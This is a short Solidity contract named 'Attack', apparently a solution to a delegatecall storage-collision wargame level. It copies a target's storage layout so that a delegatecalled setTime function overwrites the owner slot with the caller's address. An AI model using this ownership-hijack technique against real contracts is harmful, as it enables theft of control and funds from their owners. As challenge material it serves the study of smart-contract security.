// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.12;

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
